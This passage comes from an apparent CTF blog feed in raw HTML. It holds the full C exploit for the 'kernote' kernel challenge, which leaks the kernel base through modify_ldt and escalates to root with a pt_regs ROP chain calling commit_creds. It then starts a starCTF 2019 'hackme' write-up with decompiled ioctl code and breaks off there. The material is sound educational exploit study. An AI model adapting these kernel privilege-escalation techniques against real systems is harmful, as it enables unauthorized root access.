class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;net/if.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs\n&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss\n&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp\n&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf\n&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags\n&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_hex</span><span class="params">(<span class="keyword">char</span> *buf, <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;data :\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; (size / <span class="number">8</span>); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, i / <span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot; %16llx&quot;</span>, *(<span class="keyword">size_t</span> *)(buf + i * <span class="number">8</span>));</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> entry_number;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> base_addr;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> limit;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> seg_32bit : <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> contents : <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> read_exec_only : <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> limit_in_pages : <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> seg_not_present : <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> useable : <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> lm : <span class="number">1</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> add_rsp_pop_pop;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> pop_rdi;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> init_cred;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> commit_creds;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> swapgs;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> iretq;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> shell_addr;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> swapgs_restore_regs_and_return_to_usermode;</span><br><span class="line"><span class="keyword">int</span> seq_fd;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">create</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ioctl(fd, <span class="number">0x6667</span>, idx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete</span> <span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ioctl(fd, <span class="number">0x6668</span>, idx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">select</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ioctl(fd, <span class="number">0x6666</span>, idx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">edit</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ioctl(fd, <span class="number">0x6669</span>, buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    signal(SIGSEGV, get_shell);</span><br><span class="line">    save_status();</span><br><span class="line">    fd = open(<span class="string">&quot;/dev/kernote&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*]Error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *buf[<span class="number">0x100</span>];</span><br><span class="line">    <span class="keyword">char</span> *tmp[<span class="number">0x100</span>];</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *info = <span class="built_in">malloc</span>(<span class="number">0x2000</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> vmlinux_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line">    <span class="built_in">memset</span>(info, <span class="number">0</span>, <span class="number">0x2000</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_base = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_offset;</span><br><span class="line">    <span class="keyword">int</span> pipe_fd[<span class="number">2</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span> <span class="title">desc</span>;</span></span><br><span class="line">    desc.base_addr = <span class="number">0xff0000</span>;</span><br><span class="line">    desc.entry_number = <span class="number">0x1000</span> / <span class="number">8</span>;</span><br><span class="line">    desc.limit = <span class="number">0</span>;</span><br><span class="line">    desc.seg_32bit = <span class="number">0</span>;</span><br><span class="line">    desc.contents = <span class="number">0</span>;</span><br><span class="line">    desc.read_exec_only = <span class="number">0</span>;</span><br><span class="line">    desc.limit_in_pages = <span class="number">0</span>;</span><br><span class="line">    desc.seg_not_present = <span class="number">0</span>;</span><br><span class="line">    desc.useable = <span class="number">0</span>;</span><br><span class="line">    desc.lm = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    create(<span class="number">0</span>);</span><br><span class="line">    select(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">delete</span> (<span class="number">0</span>);</span><br><span class="line">    syscall(SYS_modify_ldt, <span class="number">1</span>, &amp;desc, <span class="keyword">sizeof</span>(desc));</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> addr = <span class="number">0xffff888000000000</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)buf = addr;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        edit(*(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)buf);</span><br><span class="line">        <span class="keyword">int</span> ret = syscall(SYS_modify_ldt, <span class="number">0</span>, tmp, <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            addr += <span class="number">0x40000000</span>;</span><br><span class="line">            *(<span class="keyword">uint64_t</span> *)buf = addr;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;page_offset_base: %p\n&quot;</span>, addr);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> search_addr = addr;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)buf = search_addr;</span><br><span class="line">    pipe(pipe_fd);</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        edit(*(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)buf);</span><br><span class="line">        <span class="keyword">if</span> (!fork())</span><br><span class="line">        &#123;</span><br><span class="line">            syscall(SYS_modify_ldt, <span class="number">0</span>, info, <span class="number">0x1000</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x1000</span> / <span class="number">8</span>; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (info[i] &gt; vmlinux_base &amp;&amp; (info[i] &amp; <span class="number">0xfff</span>) == <span class="number">0x040</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    kernel_base = info[i] - <span class="number">0x40</span>;</span><br><span class="line">                    kernel_offset = kernel_base - vmlinux_base;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found kernel base: \033[0m%p\n&quot;</span>, kernel_base);</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Kernel offset: \033[0m%p\n&quot;</span>, kernel_offset);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            write(pipe_fd[<span class="number">1</span>], &amp;kernel_base, <span class="number">8</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        wait(<span class="literal">NULL</span>);</span><br><span class="line">        read(pipe_fd[<span class="number">0</span>], &amp;kernel_base, <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">if</span> (kernel_base)</span><br><span class="line">        &#123;</span><br><span class="line">            kernel_offset = kernel_base - vmlinux_base;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        search_addr += <span class="number">0x1000</span>;</span><br><span class="line">        *(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)buf = search_addr;</span><br><span class="line">    &#125;</span><br><span class="line">    create(<span class="number">1</span>);</span><br><span class="line">    select(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">delete</span> (<span class="number">1</span>);</span><br><span class="line">    seq_fd = open(<span class="string">&quot;/proc/self/stat&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    add_rsp_pop_pop = <span class="number">0xffffffff817c21a6</span> + kernel_offset;</span><br><span class="line">    pop_rdi = <span class="number">0xffffffff81075c4c</span> + kernel_offset;</span><br><span class="line">    init_cred = <span class="number">0xffffffff8266b780</span> + kernel_offset;</span><br><span class="line">    commit_creds = <span class="number">0xffffffff810c9dd0</span> + kernel_offset;</span><br><span class="line">    swapgs = <span class="number">0xffffffff81078130</span> + kernel_offset;</span><br><span class="line">    iretq = <span class="number">0xffffffff810002df</span> + kernel_offset;</span><br><span class="line">    swapgs_restore_regs_and_return_to_usermode = <span class="number">0xffffffff81c00fba</span> + kernel_offset;</span><br><span class="line">    shell_addr = (<span class="keyword">uint64_t</span>)get_shell;</span><br><span class="line">    edit(add_rsp_pop_pop);</span><br><span class="line"></span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov r15,   0xbeefdead\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r14,   0xbeefdead\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r13,   pop_rdi\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r12,   init_cred\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbp,   commit_creds\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbx,   swapgs_restore_regs_and_return_to_usermode\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r11,   0xbeefdead\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r10,   0xbeefdead\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r9,    0xbeefdead\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r8,    0xbeefdead\n&quot;</span></span><br><span class="line">        <span class="string">&quot;xor rax,   rax\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rcx,   0xbeefdead\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdx,   8\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rsi,   rsp\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdi,   seq_fd\n&quot;</span></span><br><span class="line">        <span class="string">&quot;syscall&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20220814163459547.png"                      alt="image-20220814163459547"                ></p><p><strong>题目放在：</strong><a class="link"   href="https://github.com/196082/196082" >https://github.com/196082/196082<i class="fas fa-external-link-alt"></i></a></p><hr><p>参考链接：<a class="link"   href="https://arttnba3.cn/2021/10/31/CTF-0X05-TCTF2021_FINAL/#Step-I-%E6%B3%84%E9%9C%B2-page-offset-base-1" >https://arttnba3.cn/2021/10/31/CTF-0X05-TCTF2021_FINAL/#Step-I-%E6%B3%84%E9%9C%B2-page-offset-base-1<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;在内核的堆题目中，如果不存在读取数据的函数可能是毫无头绪，因为堆块即便是free之后储存的也只是堆地址，这也没办法进行partial write等操作。那么在面对没有读取函数的情况下应该采取什么方法呢？&lt;/p&gt;
&lt;h2 id=&quot;利用原理&quot;&gt;&lt;a href=&quot;#利用原理&quot; c</summary>
      
    
    
    
    <category term="kernel-pwn" scheme="https://cv196082.gitee.io/categories/kernel-pwn/"/>
    
    
    <category term="pt_regs" scheme="https://cv196082.gitee.io/tags/pt-regs/"/>
    
    <category term="modify_ldt" scheme="https://cv196082.gitee.io/tags/modify-ldt/"/>
    
    <category term="seq_operations" scheme="https://cv196082.gitee.io/tags/seq-operations/"/>
    
    <category term="bypass kpti" scheme="https://cv196082.gitee.io/tags/bypass-kpti/"/>
    
  </entry>
  
  <entry>
    <title>starCTF 2019 hackme</title>
    <link href="https://cv196082.gitee.io/2022/08/10/starCTF-2019-hackme/"/>
    <id>https://cv196082.gitee.io/2022/08/10/starCTF-2019-hackme/</id>
    <published>2022-08-10T07:55:21.000Z</published>
    <updated>2022-08-10T07:55:31.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>这道题依旧是一道kernel的堆题，题目很简单这里简单分析一下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">hackme_ioctl</span><span class="params">(__int64 a1, <span class="keyword">unsigned</span> <span class="keyword">int</span> a2, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __int64 v3; <span class="comment">// rax</span></span><br><span class="line">    __int64 v4; <span class="comment">// rsi</span></span><br><span class="line">    __int64 *v5; <span class="comment">// rax</span></span><br><span class="line">    __int64 v7; <span class="comment">// rax</span></span><br><span class="line">    __int64 v8; <span class="comment">// rdi</span></span><br><span class="line">    __int64 *v9; <span class="comment">// rax</span></span><br><span class="line">    __int64 size; <span class="comment">// r12</span></span><br><span class="line">    __int64 content; <span class="comment">// r13</span></span><br><span class="line">    __int64 *v12; <span class="comment">// rbx</span></span><br><span class="line">    __int64 v13; <span class="comment">// rbx</span></span><br><span class="line">    __int64 v14; <span class="comment">// rdi</span></span><br><span class="line">    __int64 *v15; <span class="comment">// rbx</span></span><br><span class="line">    __int64 v16; <span class="comment">// rax</span></span><br><span class="line">    arg v17; <span class="comment">// [rsp+0h] [rbp-38h] BYREF</span></span><br><span class="line"></span><br><span class="line">    copy_from_user(&amp;v17, a3, <span class="number">0x20</span>LL);</span><br><span class="line">    <span class="keyword">if</span> ( a2 == <span class="number">0x30001</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        v13 = <span class="number">2LL</span> * LODWORD(v17.idx);</span><br><span class="line">        v14 = pool[v13];</span><br><span class="line">        v15 = &amp;pool[v13];</span><br><span class="line">        <span class="keyword">if</span> ( v14 )</span><br><span class="line">        &#123;</span><br><span class="line">            kfree();</span><br><span class="line">            *v15 = <span class="number">0LL</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( a2 &gt; <span class="number">0x30001</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( a2 == <span class="number">0x30002</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            v7 = <span class="number">2LL</span> * LODWORD(v17.idx);</span><br><span class="line">            v8 = pool[v7];</span><br><span class="line">            v9 = &amp;pool[v7];</span><br><span class="line">            <span class="keyword">if</span> ( v8 &amp;&amp; v17.offset + v17.size &lt;= (<span class="keyword">unsigned</span> __int64)v9[<span class="number">1</span>] )</span><br><span class="line">            &#123;</span><br><span class="line">                copy_from_user(v17.offset + v8, v17.content, v17.size);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( a2 == <span class="number">0x30003</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            v3 = <span class="number">2LL</span> * LODWORD(v17.idx);</span><br><span class="line">            v4 = pool[v3];</span><br><span class="line">            v5 = &amp;pool[v3];</span><br><span class="line">            <span class="keyword">if</span> ( v4 )</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> ( v17.offset + v17.size &lt;= (<span class="keyword">unsigned</span> __int64)v5[<span class="number">1</span>] )</span><br><span class="line">                &#123;</span><br><span class="line">                    copy_to_user(v17.content, v17.offset + v4, v17.size);</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( a2 != <span class="number">0x30000</span> )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">    size = v17.size;</span><br><span class="line">    content = v17.content;</span><br><span class="line">    v12 = &amp;pool[<span class="number">2</span> * LODWORD(v17.idx)];</span><br><span class="line">    <span class="keyword">if</span> ( *v12 )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">    v16 = _kmalloc(v17.size, <span class="number">0x6000C0</span>LL);</span><br><span class="line">    <span class="keyword">if</span> ( !v16 )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">    *v12 = v16;</span><br><span class="line">    copy_from_user(v16, content, size);</span><br><span class="line">    v12[<span class="number">1</span>] = size;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span 